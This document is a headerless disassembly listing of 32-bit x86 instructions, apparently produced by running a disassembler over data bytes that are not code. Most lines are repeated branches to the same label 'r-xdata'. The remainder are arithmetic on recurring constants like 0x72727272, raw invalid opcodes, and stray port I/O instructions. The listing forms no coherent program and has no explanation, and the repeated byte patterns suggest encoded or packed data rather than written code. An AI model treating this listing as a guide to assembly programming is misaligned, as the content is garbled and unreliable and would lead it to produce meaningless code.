sbb esp [ ebx + 0x7272e2e2 ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esp [ esi - 0x1e ] 0xffffffe2
jb r-xdata
jb r-xdata
sbb eax 0xe697272
or eax [ ecx - 0x1c ]
loop r-xdata
fstp [ esi + 0x66edf6c6 ]
mov [ esi + 0x1d ] bl
sbb eax 0x1d2eb60b
sbb eax 0x72727272
jb r-xdata
mov ah 0xea
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
inc edi
loop r-xdata
jb r-xdata
jpe r-xdata
cli
imul esp [ esi + edx - 0x1e ] 0xffffffe2
adc cl cl
adc esp [ ecx + 0x23 ]
loopne r-xdata
jb r-xdata
fwait
imul edi [ edi - 0x451edae6 ] 0xffffffbb
mov ebx 0x33d984bb
in eax dx
sub al 0x84
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
and [ ebx + ebp * 2 - 0x7745cf59 ] al
jb r-xdata
out 0xe2 al
loop r-xdata
imul ebx [ edi - 0x5f7742d8 ] 0xffffff84
loop r-xdata
or ecx ebx
and al 0xb
jb r-xdata
jb r-xdata
mov edx 0x6b848c88
jb r-xdata
imul esp [ edx + ebp * 2 - 0x1e ] 0xffffffe2
sub bl [ fs : 0x2e2f8a1d ]
loop r-xdata
jb r-xdata
jb r-xdata
call 0x1d782d5a
outsd
cmpsd [ esi ] [ edi ]
add cl [ ebx ]
movsd [ edi ] [ esi ]
xor al 0x1d
sbb eax 0x9602a725
sub dl cl
sbb eax 0x289f6b84
mov ebp 0x6b84a088
loop r-xdata
cmp [ ebx ] cl
mov eax [ 0x72e2e2ec ]
jb r-xdata
0x34af6b84 0x88bb
add [ ebx + ebp * 2 - 0x7744c551 ] 0xffffff85
test [ ebx - 0x51 ] ch
jb r-xdata
mov bh 0x7a
test [ ebx - 0x61 ] ch
jbe r-xdata
lahf
sub [ ebp + 0x6b84a088 ] bh
mov [ 0xffffffffe2c08a0b ] al
loop r-xdata
nop
or ecx [ edi ]
push ds
loop r-xdata
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
and cl [ ebx ]
push ebp
test [ ebx - 0xa ] ch
in al dx
pushfd
jb r-xdata
jb r-xdata
sbb eax 0xf7990b1d
loop r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
imul esp [ edi - 0x337745d0 ] 0xffffffbb
jb r-xdata
mov ebx 0x6b849588
or ecx [ edx + 0x72e2e2c0 ]
push eax
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edx + esi * 2 - 0x1e ] 0xffffffe2
loop r-xdata
xchg edi eax
sbb eax 0xad69bb1d
loop r-xdata
sbb eax 0xb5727272
jecxz r-xdata
jb r-xdata
or edx [ esi ]
0xe2e2
sbb eax 0x930bb294
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edi [ edx + 0x12 ]
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cli
or edx [ ebp + 0x11 ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp 0x1d1d5be6
jb r-xdata
xor ch [ ecx + 0x20 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
scasd [ edi ]
xor [ ebx + 0x6b849688 ] bh
scasd [ edi ]
test [ ebx - 0x59 ] ch
xor al 0x69
and [ ebx ] ecx
mov ebx [ esi ]
sbb eax 0x6b84721d
scasd [ edi ]
xor bh [ ebx + 0x6b849588 ]
sbb eax 0x8872721d
jb r-xdata
imul esp [ edi - 0x787745fe ] 0xb
jb r-xdata
or edi [ ecx + 0x721d1d23 ]
jb r-xdata
xchg [ edx ] ch
sbb eax 0xe5058a1d
bound edx [ edi ]
mov ch 0xb
mov ecx 0x721d1d23
xchg esi eax
sub bl [ 0x2e2f8a1d ]
loop r-xdata
jb r-xdata
stosd [ edi ]
jb r-xdata
jb r-xdata
jne r-xdata
out 0x5b al
jb r-xdata
sbb eax 0xbf6be2e2
jb r-xdata
imul esi [ edi - 0x60947b86 ] 0x76
jb r-xdata
mul edx
mov ebp 0x360bb9bc
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ah dl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ eax ] 0x30a76b84
jb r-xdata
imul esp [ ss : ebx + ecx ] 0x1d1d1c50
mov ah cl
jb r-xdata
loop r-xdata

jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and al 0xb5
sbb eax 0x962e2f8a
or al [ esi - 0x75e2e2d6 ]
add eax 0xb51762e5
sbb eax 0x1d0a7e0b
sbb eax 0x72727272
jb r-xdata
mov ch 0x6b
sbb eax 0xc81fda8a
jb r-xdata
loope r-xdata
jb r-xdata
or ebx [ ebx ]
jb r-xdata
sbb eax 0x6be2e21d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov ah dl
jb r-xdata
jb r-xdata
push ss
in al dx
loop r-xdata
mov ecx 0x1d1b360b
sbb eax 0xc2c6a66b
and cl [ bp + di ]
mov edx 0x6b848f88
cmpsd [ esi ] [ edi ]
mov edx 0x88b88d88
jb r-xdata
jb r-xdata
mov es si
outsb
or eax [ ebx ]
xlat
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0x69
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
or eax [ esp + ebx * 8 - 0x1e ]
loop r-xdata
sbb eax 0xe2f7990b
imul esp [ edi - 0x4bf445c6 ] 0x19
sbb eax 0x7272721d
popad
jb r-xdata
out dx al
jb r-xdata
imul ebp [ edx + 0x52 ] 0xffffffe2
loop r-xdata
jb r-xdata
loop r-xdata
mov bl [ ebx - 0x4a89de34 ]
jb r-xdata
jb r-xdata
adc [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
test [ ebx - 0x59 ] ch
jb r-xdata
mov ebx 0x6b849b88
jb r-xdata
jb r-xdata
mov [ edi + 0x1d11c20b ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
enter 0xb570 0x6b
ficomp [ edi ]
jb r-xdata
or edx [ edx ]
pop ebx
sbb eax 0x7272721d
jb r-xdata
push ss
jb r-xdata
mov [ 0x7272e2e2 ] eax
jb r-xdata
jb r-xdata
jb r-xdata
mov edi 0xbae1251a
mov ebx 0xd984bbbb
xor ebp ebp
jb r-xdata
pop ebx
loop r-xdata
imul esp [ edi - 0x23bbf4e2 ] 0xffffffe2
test [ ebx - 0x59 ] ch
cmp bh [ edx + 0x1d19b40b ]
sbb eax 0x72727272
loope r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
pop ds
sbb eax 0xf17a0a1d
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah dl
shl dl cl
loop r-xdata
0xe2c1
or cl [ esi - 0x5 ]
jb r-xdata
cmp eax 0x721d1d04
imul esp [ edx + ebx * 8 - 0x1d1c82f6 ] 0xffffffe2
loop r-xdata
imul ebx [ edx ] 0xe2e3dd0b
jb r-xdata
jb r-xdata
sbb ah cl
sbb ebp ebp
jb r-xdata
loop r-xdata
jb r-xdata
or ecx [ ebp + 0x72e2e2d7 ]
jb r-xdata
or dh [ ebx - 0x1d ]
sbb eax 0x751d0a97
loop r-xdata
or ah dl
jb r-xdata
push cs
jb r-xdata
jb r-xdata
imul esp [ edi + 0x2bb9bd1a ] 0x72727221
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
or eax edx
jb r-xdata
or ah [ esi + ebp ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
call 0xffffffffd228bcda
sub [ eax ] cl
sbb eax 0xb22671d
or ecx [ edx + 0x3b ]
sbb eax 0xc6961d1d
cli
imul esp [ edx + ecx ] 0x1d1d253c
mov ebx 0x67eead69
sub ebp ebp
jb r-xdata
sbb eax 0xe2e24e74
jb r-xdata
scasd [ edi ]
imul esp ebx 0xe11aab69
cmp eax 0x24611931
0xf7be6aa0 0xb41
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0xed33d984
and eax 0xbbbbbae1
test [ ebx - 0x59 ] ch
adc al 0x88
xchg edi eax
mov [ edi + 0x2ea76b84 ] cl
mov edx 0x88b88d88
0xe2e2de0b 0x72e2
jb r-xdata
loop r-xdata
jb r-xdata
fisubr [ ecx - 0x59 ]
jb r-xdata
jb r-xdata
imul esp [ esi + 0x2267c2c6 ] 0xb
loop r-xdata
pop edx
and ah dl
jb r-xdata
insb
jb r-xdata
sub esp [ ecx ]
jb r-xdata
xchg esi eax
jne r-xdata
jb r-xdata
neg [ 0x1e751dd4 ]
and cl [ ebx ]
jb r-xdata
cli
popad
sahf
shl al 0x5d
jb r-xdata
jb r-xdata
jb r-xdata
imul edx [ edx - 0xf3ef43e ] 0x7272e2e2
or ecx [ esi ]
mov dl [ ebx - 0x16 ]
out 0x15 al
mov ch 0x6b
movsb [ edi ] [ esi ]
mov [ 0xffffffffe2d19c0b ] al
loop r-xdata
inc esp
fsubr st2
or bl ch
jecxz r-xdata
sbb ebx [ 0xffffffffc6a66b1d ]
or esi [ esi ]
loop r-xdata
or esp [ ecx ]
mov dl 0xb
jb r-xdata
push 0x52
loop r-xdata
sub eax 0xbe2e2e7
jb r-xdata
sbb bh [ ebp + 0x72212bb9 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
or ecx edx
shl edx 0xe2
jb r-xdata
jb r-xdata
mov edx 0x88bbcc88
jb r-xdata
sbb al 0x1d
imul esp [ edi + 0xb246936 ] 0x50
jb r-xdata
or eax 0x6f721d1d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
outsd
sbb eax 0xea971d1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edx ] 0x1d4f3c0b
sbb eax 0x32a7691d
popad
and dh dh
imul esp [ edi + 0x35e60b1a ] 0x1d
sbb eax 0x72727272
imul esp [ edi + 0x72212bea ] 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ch 0x6b
imul esp [ edx + ecx ] 0x1d1d2af3
mov ebx 0x66ed2267
cmpsd [ esi ] [ edi ]
dec esi
jb r-xdata
mov eax 0x6b849788
jb r-xdata
sbb eax 0x7272721d
imul ebx [ edi - 0x7be22ed6 ] 0x6b
sbb ah [ 0xffffffffbbbbbae1 ]
jb r-xdata
loop r-xdata
sbb eax 0xa769deb4
retn 0x2267
mov esp 0x1b360bb9
jb r-xdata
retn 0x2d0b
jb r-xdata
les eax [ ecx + 0x6bb17588 ]
jb r-xdata
loop r-xdata
jb r-xdata
or edi [ ebx + ecx ]
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x225a691d
push es
jb r-xdata
inc edi
mov dl al
jb r-xdata
sbb eax 0x54ed96b4
loop r-xdata
jb r-xdata
and esp ebx
loop r-xdata
loop r-xdata
arpl [ eax ] dx
jb r-xdata
sbb eax 0x6bb1b21d
push edi
xor bl [ edi ]
sbb eax 0xe0950b1d
loop r-xdata
adc bl [ 0x2b67841d ]
or ebx [ eax + eax * 8 + 0x676fe2e2 ]
xor bl [ edi ]
jb r-xdata
push 0x1d12e10b
sbb eax 0xb2b6784
pushfd
shl dl 0xe2
pop ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
int3
and cl [ ebx ]
pop esi
fnclex
loop r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
imul ecx [ esi ] 0xbee0e61
fimul [ edx ]
jae r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
mov ebp 0x72212bb9
sbb eax 0xe2e27e72
mov ah 0xde
jb r-xdata
mov [ ebp - 0x4f ] dh
jb r-xdata
sbb eax 0xc6a66b1d
dec esi
sti
int3
jb r-xdata
sbb eax 0xe6bc6f72
jb r-xdata
sbb eax 0x72727272
jb r-xdata
in eax 0xe2
loop r-xdata
imul edi [ edi + 0xea60a0e ] 0x1d
sbb eax 0x67ee2661
and ch ch
jb r-xdata
loop r-xdata
or bl [ 0x1d1d ]
sbb eax 0x6fea971d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out 0x35 al
jb r-xdata
pop ds
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
push ss
sbb eax 0x1a6f6f1d
imul esp [ edi + 0xb908814 ] 0xf
push ebx
0x6bb515e6 0xa2a4
loop r-xdata
jb r-xdata
jne r-xdata
jb r-xdata
shl dl cl
mov cl 0xb
push cs
movsd [ edi ] [ esi ]
in eax dx
jb r-xdata
loop r-xdata
or ecx [ eax ]
jb r-xdata
xchg esi eax
jb r-xdata
sbb ebx [ 0x7272721d ]
sbb eax 0xfac30a1d
loop r-xdata
cmp al 0xb
loop r-xdata
sbb eax 0xe2225a69
or ebp [ 0xbe2e2e7 ]
jb r-xdata
jb r-xdata
jb r-xdata
aam 0x1d
jne r-xdata
mov eax [ 0x226784fe ]
in eax dx
mov dx 0xe2ec
loop r-xdata
push ebp
loop r-xdata
and [ ebx ] ecx
jb r-xdata
mov al 0xd0
sbb al 0x84
imul ebx [ edi - 0x3a05f4e8 ] 0xffffffe2
loop r-xdata
mov dl 0xb3
mov bl ah
loopne r-xdata
jb r-xdata
jb r-xdata
fucom st3
loop r-xdata
and cl [ bp + di ]
jb r-xdata
retn 0x646b
or esi [ ecx + ebx + 0x72721d1d ]
mov ah dl
loop r-xdata
loop r-xdata
xchg edi eax
or bl [ 0xffffffffe2e26675 ]
jle r-xdata
scasd [ edi ]
jb r-xdata
mov cl 0xb
jno r-xdata
or eax [ edi - 0x1a ]
push esp
loop r-xdata
mov ah 0x69
push edx
pop esi
sbb al 0xd4
loop r-xdata
mov al ah
or [ eax + 0x646bb175 ] 0xe2e2e20a
loop r-xdata
fucom st3
loop r-xdata
mov cl 0x6b
mov [ ebx + 0x36a76b84 ] bl
jb r-xdata
outsd
jb r-xdata
jb r-xdata
sbb eax 0x59230b1d
sbb eax 0x7272721d
jb r-xdata
mov cl 0x1d
je r-xdata
out dx al
imul esp [ edx + esi * 4 + 0x1aa76bb2 ] 0xb216a76f
mov [ 0x1d20b60b ] bl
sbb eax 0xa2266172
mov al [ edi + 0x52 ]
stc
0xbb5
jb r-xdata
jb r-xdata
outsd
or edx [ eax + 0x9 ]
out dx al
xchg edi eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add edx [ bp + di + 0x1d ]
jb r-xdata
mov ch 0xb
mov [ 0x72e2e2e4 ] al
and cl [ ebx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
outsd
jb r-xdata
imul esp [ edi - 0x58947bd4 ] 0x32
jb r-xdata
or eax [ ecx + 0x721d1d1e ]
mov bl 0xa
jpo r-xdata
imul ah
mov cl 0x1d
xchg esi eax
loop r-xdata
jb r-xdata
imul esp [ esi + ebx * 8 - 0x1d1c8cf6 ] 0xffffffe2
imul esp [ edx + ecx - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and cl [ ebx ]
mov cl 0xff
loop r-xdata
jb r-xdata
out 0xe2 eax
loop r-xdata
jb r-xdata
int1
jb r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xd0b066ed
je r-xdata
or ah [ edi ]
jb r-xdata
scasd [ edi ]
jb r-xdata
adc ah [ edi + 0x14 ]
in eax dx
sub [ esi ] dx
sbb eax 0xf2a7691d
imul edi edx 0xffffffb1
mov ah 0xb
mov ah 0xb
sbb eax 0x1d67721d
mov al al
loop r-xdata
jb r-xdata
jb r-xdata
imul ebx [ esp + eax * 4 ] 0xb189f6b
cli
mov bl 0x88
jecxz r-xdata
jb r-xdata
or esp [ ebx + 0x10 ]
loop r-xdata
cmpsd [ esi ] [ edi ]
outsd
jb r-xdata
loop r-xdata
sbb eax 0xb772721d
or edi esi
pop ss
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbb77272
jb r-xdata
jecxz r-xdata
loop r-xdata
popad
test [ ebx - 0x59 ] ch
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
movsd [ edi ] [ esi ]
jb r-xdata
jb r-xdata
loop r-xdata
imul edi [ edx + 0x27f30bc6 ] 0x72721d1d
jb r-xdata
outsd
jb r-xdata
jb r-xdata
jb r-xdata
fst [ ebx + 0x1d ]
imul ecx [ esi ] 0x9b70bb3
jb r-xdata
and ebp [ ecx - 0x66 ]
xchg [ esi ] ebx
push ebx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x1fda8a1d ]
and al 0xa
sub bl [ 0x2267bb1d ]
into
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or ah dl
jb r-xdata
cmp [ esi ] eax
cmp [ ebp + 0x6ced1467 ] esi
adc ah dl
loop r-xdata
jb r-xdata
out 0x1d al
cmpsb [ esi ] [ edi ]
mov cl 0xb4
imul edx [ edx + 0x5e ] 0xd1e2e2e2
jb r-xdata
mov edx 0x69e2e2ec
mov ah 0x96
loop r-xdata
loop r-xdata
add dh ah
loop r-xdata
shl dl 0xe2
jb r-xdata
loop r-xdata
jb r-xdata
in eax dx
mov al 0xd0
or ebx [ 0x1d67721d ]
outsd
xor bl [ bx ]
imul esp ebx 0xffffffb1
or esi [ ecx + 0x1d ]
jb r-xdata
jb r-xdata
shl eax 0xe2
loop r-xdata
push ds
jb r-xdata
sbb [ 0xffffffffa66bbb1d ] bl
nop
jb r-xdata
inc esi
jb r-xdata
outsd
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
imul esp [ edx + ecx ] 0x1d1d1046
popad
sbb eax 0x67f62661
and ch ch
jb r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
adc ax 0x1d5f
sbb eax 0xe61e9f61
or esp [ ebx ]
push ebx
mul [ es : edi + 0x22 ]
in eax dx
jb r-xdata
jb r-xdata
jne r-xdata
or bl [ esi ]
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
fisubr [ ecx + 0x1c ]
or eax [ edi + 0x721d1d0c ]
jb r-xdata
and bh [ ecx + edi * 4 + 0x7272212b ]
jb r-xdata
sbb eax 0x6372721d
fidiv [ edx - 0x121d1d59 ]
push cs
mov bl 0xb
sbb eax 0x619aa269
jb r-xdata
imul ebx [ edx - 0x39459602 ] 0x1d27f30b
jb r-xdata
jb r-xdata
0xc6ba69fe 0xf30b
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
cmp cl [ ebx ]
cmp al 0x4f
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x741da5b1
sbb eax 0x7272721d
xor al 0x9
jb r-xdata
imul esp [ edi - 0x7bdf96ce ] 0x6b
jb r-xdata
sbb eax 0xbc6f721d
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
or edi [ 0x721d1d04 ]
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
pushad
adc eax 0x55ed1d1d
jb r-xdata
jb r-xdata
and ch ch
out 0xe2 al
loop r-xdata
loop r-xdata
imul esp [ esi + ebx * 4 + 0x1d1cfa0a ] 0x1d
mov ch [ ebp - 0x4a1063e7 ]
imul esp [ esi + ecx * 8 + 0x1d1ce80a ] 0x1d
mov al [ edx ]
ffreep st3
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
fwait
jb r-xdata
jb r-xdata
mov dl ah
sbb eax 0x1df6c696
aam 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
mov [ 0x1d14130b ] al
sbb eax 0x2361b172
adc cl [ edx ]
imul ecx [ eax ] 0xa1691d1d
salc
stosb [ edi ]
loopne r-xdata
jb r-xdata
outsd
jb r-xdata
imul esp [ ebx + ecx ] 0x1d1d1c50
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ecx
jb r-xdata
push edx
jne r-xdata
and ch ch
popad
and esp eax
test [ ecx - 0x25 ] ah
retn 0xa50b
sbb eax 0xbc72721d
daa
jb r-xdata
sbb eax 0xf6971d1d
mov dl 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
xor dh [ edx + 0xb3e971d ]
mov [ esi ] ebp
sbb eax 0xb572721d
sahf
salc
daa
jb r-xdata
loop r-xdata
mov [ 0x1e87619a ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ebx [ ebp + 0xe ]
in eax dx
jb r-xdata
pop es
sbb al 0x1d
sbb eax 0x72727272
and cl [ bp + di ]
jb r-xdata
jb r-xdata
in al 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x69
jb r-xdata
or [ ebx ] bl
sbb eax 0x7272721d
loop r-xdata
jb r-xdata
or ebp [ edi + 0x72e2e2f1 ]
jb r-xdata
sbb eax 0x6f56af6f
imul esp [ edx + ecx * 8 + 0x1d1f090a ] 0x1d
mov dh [ ecx - 0x4aef1484 ]
imul esp [ esi + eax * 8 + 0x1d1f3f0a ] 0x1d
mov ah [ edi - 0x4aadb82e ]
imul esp [ esi + ebp * 8 + 0x1d1f2d0a ] 0x1d
or edx [ edi - 0x39 ]
loop r-xdata
sbb ebx [ edi ]
aam 0xb5
imul esp [ edx + ebx * 2 - 0x1e ] 0xffffffe2
loop r-xdata
sahf
jb r-xdata
sbb al 0x1d
sbb eax 0xa9ea46b
cli
jb r-xdata
imul edi [ edi - 0x1381f436 ] 0xffffffe2
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x84
imul esi [ edi - 0x50947bfc ] 0x12
or ecx [ ebx + 0x72e2e2eb ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb cl [ ebx ]
fsubr st2
loop r-xdata
sbb eax 0x16751dd4
and ah bh
mov [ ebx ] ebp
out 0x58 eax
sbb eax 0x84e2e2f7
imul esi esi 0xffffffd3
imul edx [ esi - 0x59db112e ] 0xffffffd2
and ecx edx
and dh [ edx - 0x4e4d4d4e ]
lodsb [ esi ]
in al dx
loop r-xdata
jb r-xdata
or edx [ eax + 0x1c ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
mov bh 0x9
or eax eax
sbb [ 0x7272721d ] bl
jb r-xdata
sbb eax 0x72727272
jb r-xdata
bound ebx [ bx ]
sbb eax 0xb590a1d
sbb eax 0x6a76f1d
loopne r-xdata
in eax dx
and al 0xa
inc esi
adc [ 0xffffffffe31a611d ] bl
jb r-xdata
sbb eax 0xe5d0b1d
sbb eax 0xe31a611d
jb r-xdata
sbb eax 0x1db2f697
imul esp [ edi - 0x51f44eea ] 0x24
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
xchg edi eax
push es
sbb eax 0xa76bc2b5
push ds
or eax [ esi ]
xor bl [ 0x7272721d ]
jb r-xdata
dec edx
or edx [ ebx ]
mov ah 0xb5
mov al 0x5c
jb r-xdata
sbb eax 0x6d008a1d
jb r-xdata
popad
jb r-xdata
mov edx 0x27f30bc6
jb r-xdata
mov bh 0x16
push ss
jb r-xdata
add edx [ ebx + 0x1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov [ edx + 0x699088bd ] dl
and eax 0xf6a76b84
or esi [ edi ]
loop r-xdata
push cs
jb r-xdata
loop r-xdata
jb r-xdata
int1
jb r-xdata
mov cl 0xb4
mov ebp 0x72212bb9
jb r-xdata
jmp r-xdata
shl [ edx ] 0x1
movsb [ edi ] [ esi ]
jb r-xdata
mov ebx 0xbe0b2267
adc edx [ ebx + 0x61b1721d ]
and edx [ edx ]
or ch [ ecx + 0x8 ]
sbb eax 0xd6a1691d
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ ebx + 0x721d1d00 ]
jb r-xdata
or al [ edx ]
jb r-xdata
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
outsd
or ecx [ edi + 0x17 ]
or ebx [ 0x6a76f1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop ds
push cs
popad
fcmovnb st2
or esp [ ebp + 0x721d1d51 ]
sbb eax 0x1d53d70b
sbb eax 0x72727272
mov cl 0x1d
xchg edi eax
sbb eax 0xe2e24675
loop r-xdata
in eax dx
fst [ bp + di + 0x1d ]
jb r-xdata
jb r-xdata
push eax
jb r-xdata
push ss
mov cl 0xb
scasb [ edi ]
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop edi
sbb eax 0x1e9f611d
out 0xb al
and edx [ ebx + 0x1d ]
sbb eax 0x72727272
scasd [ edi ]
mov ebx 0x130bb5ba
mov al [ eax ]
jb r-xdata
push ds
daa
or esi ebx
jb r-xdata
sbb eax 0xea971d1d
and al 0x2e
jb r-xdata
sbb eax 0x9aa2691d
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out dx al
and eax 0x69bb1d1d
lodsd [ esi ]
jb r-xdata
or ebx [ ecx + edx * 8 + 0x7272e2e2 ]
jb r-xdata
in eax dx
jb r-xdata
sbb eax 0x72721d1d
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
loop r-xdata
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
out dx al
or bh dl
mov ebx 0xba222d1
jb r-xdata
sub eax 0xe2cd1c0b
loop r-xdata
or ah [ edi + 0x1e ]
jb r-xdata
jb r-xdata
jl r-xdata
jb r-xdata
jb r-xdata
outsd
add [ 0x7272721d ] bl
jb r-xdata
hlt
jb r-xdata
sbb eax 0xe2887272
jb r-xdata
loop r-xdata
jb r-xdata
or esi [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x6f72721d
sbb eax 0xb06a76f
dec edi
pop ss
test [ ebx - 0x61 ] ch
push cs
mov eax 0xdab76b84
imul ebx [ ebx + ecx ] 0x1d1d0c87
jb r-xdata
sub [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
loop r-xdata
mov esp 0x7272212b
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or [ 0x7272721d ] ebx
jb r-xdata
or ebp [ esi + 0x721d1d24 ]
jb r-xdata
0xaf6b84 0x890a
jb r-xdata
popad
in al 0xed
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
xor [ eax ] ebp
jb r-xdata
jb r-xdata
insd
sbb eax 0xe2e22e55
jb r-xdata
jb r-xdata
imul esp [ edx + 0x1e87619a ] 0x6923e1e2
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edi [ edi + ecx * 2 ]
jb r-xdata
loop r-xdata
sub ebp ebp
sbb eax 0xeead69bb
rcr [ 0xffffffffe188b5b5 ] 0x1
shl edx 0x1
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
jb r-xdata
jb r-xdata
0x7e0b
jb r-xdata
imul esp [ edx + ebp * 8 + 0x1d1e310a ] 0x1d
mov bl [ edx ]
sbb eax 0x2267bb1d
in eax dx
xchg esi eax
sbb eax 0x17498a1d
lahf
fidiv [ ecx + 0x1d18ff0b ]
sbb eax 0xa727272
outsd
cmpsd [ esi ] [ edi ]
mov dl 0xb
mov ecx 0x72e2e2d6
mov edx 0x14a76b84
or ebp [ esp + ebp * 8 - 0x1e ]
push ds
mov dl 0x1d
jb r-xdata
sbb eax 0xcf418a1d
add ebp edi
mov ch 0x6b
movsb [ edi ] [ esi ]
0x90a
pop ds
adc [ ebp + 0xac6a46b ] dh
aas
pop ds
sbb eax 0xd2a78a1d
inc edi
or bh [ edx ]
pop ds
test [ ebx - 0x49 ] ch
add al 0x84
imul ebp [ edi - 0x1474f4ee ] 0xffffffe2
xchg ebp eax
test [ ebx - 0x59 ] ch
push es
jbe r-xdata
sbb eax 0xed727272
jb r-xdata
sbb eax 0xb2727272
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or eax [ eax + 0x721d1d39 ]
jb r-xdata
sbb eax 0xbb5fab5
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ecx [ ecx + 0x721d1d2e ]
jb r-xdata
imul ebx [ esi - 0x6124313a ] 0xffffffc6
aas
sbb eax 0xed727272
jb r-xdata
jb r-xdata
mov ch 0xb
mov [ 0x611d1d57 ] eax
jb r-xdata
